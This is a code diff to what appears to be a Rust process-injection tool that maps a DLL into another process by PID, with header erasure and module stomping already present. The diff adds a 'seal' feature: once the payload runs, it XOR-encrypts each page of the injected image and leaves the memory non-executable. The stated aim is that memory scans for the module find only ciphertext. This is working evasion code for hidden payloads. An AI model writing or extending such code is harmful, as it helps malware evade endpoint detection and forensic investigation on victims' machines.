@@ -19,6 +19,49 @@ pub struct Options {
     pub erase_headers: bool,
     /// Map inside this module's tail slack instead of a fresh allocation.
     pub stomp: Option<String>,
+    /// L2: after the payload's entry point returns, XOR every page of the
+    /// mapping and drop it to `RW`. At rest the image is neither executable
+    /// nor PE-parseable — a "find the module" sweep sees ciphertext.
+    pub seal: bool,
+}
+
+/// Fixed ASCII key, expanded per page so neighbouring pages do not repeat.
+const SEAL_KEY: u64 = 0x4852_4f4d_4154_4954; // "HROMATIT"
+
+/// XOR one page of the remote image in place.
+fn seal_image(r: &Remote, base: usize, size: usize) -> (usize, usize) {
+    const PAGE: usize = 4096;
+    let mut done = 0usize;
+    let mut failed = 0usize;
+    let mut off = 0usize;
+    while off < size {
+        let n = (size - off).min(PAGE);
+        let addr = base + off;
+        if !r.protect(addr, n, crate::ffi::PAGE_READWRITE) {
+            failed += 1;
+            off += n;
+            continue;
+        }
+        match r.read_vec(addr, n) {
+            Some(mut buf) => {
+                let mut ks = SEAL_KEY ^ (off as u64 / PAGE as u64).wrapping_mul(0x9E37_79B9_7F4A_7C15);
+                for b in buf.iter_mut() {
+                    ks ^= ks << 13;
+                    ks ^= ks >> 7;
+                    ks ^= ks << 17;
+                    *b ^= (ks & 0xFF) as u8;
+                }
+                if r.write(addr, &buf) {
+                    done += 1;
+                } else {
+                    failed += 1;
+                }
+            }
+            None => failed += 1,
+        }
+        off += n;
+    }
+    (done, failed)
 }
 
 fn rd_u16(d: &[u8], o: usize) -> u16 {
@@ -396,5 +439,19 @@ pub fn inject(pid: u32, dll_path: &str, opts: &Options) -> Result<usize, String>
         opts.erase_headers,
         opts.stomp.as_deref().unwrap_or("-")
     ));
+
+    // L2: the payload has returned into the stub thread, so no instruction
+    // fetch can land in the image any more — encrypt it and leave it RW.
+    if opts.seal {
+        let before = r.read_vec(base, 16).unwrap_or_default();
+        let (pages, failed) = seal_image(&r, base, size);
+        let after = r.read_vec(base, 16).unwrap_or_default();
+        log::log(&format!(
+            "seal: {pages} pages XORed, {failed} failed, size {size:#x}; \
+             before {:02x?}; after {:02x?}",
+            &before[..before.len().min(16)],
+            &after[..after.len().min(16)]
+        ));
+    }
     Ok(base)
 }
